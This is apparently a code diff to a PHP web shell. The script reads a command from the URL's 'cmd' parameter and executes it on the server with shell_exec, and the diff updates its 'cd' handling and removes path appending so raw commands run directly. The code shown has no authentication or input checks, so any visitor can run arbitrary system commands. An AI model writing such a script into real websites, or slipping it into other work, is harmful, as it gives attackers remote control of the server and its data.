@@ -14,18 +14,20 @@ function showInfo($cmd = NULL) {
 }
 if (!empty($_GET['cmd'])) {
     $cmd =  $_GET['cmd'];
-  if (ereg("cd (.*)", $cmd, $file)) {
-      if((file_exists($file[1]) && is_dir($file[1])) || $file[1]='~') {
+  if (preg_match("#cd (.*)#", $cmd, $file)) {
+      if(file_exists($file[1]) && is_dir($file[1])) {
           if ($file[1]!='.') {
-            $_SESSION['path'] = $file[1];
+            shell_exec($cmd);
+            $output = shell_exec('pwd');
+            $_SESSION['path'] = $output;
           }
           showInfo('');
       } else {
           echo "<pre>$cmd: No such file or directory</pre>";
       }
   } else {
-    $path = $_SESSION['path'];
-      $output = shell_exec("$cmd $path");
+      $path = $_SESSION['path'];
+      $output = shell_exec($cmd);
       $output = str_replace(array('>','<'), array('&gt;','&lt'),$output);
       showInfo($cmd);
       echo "<pre>$output</pre> <hr>";
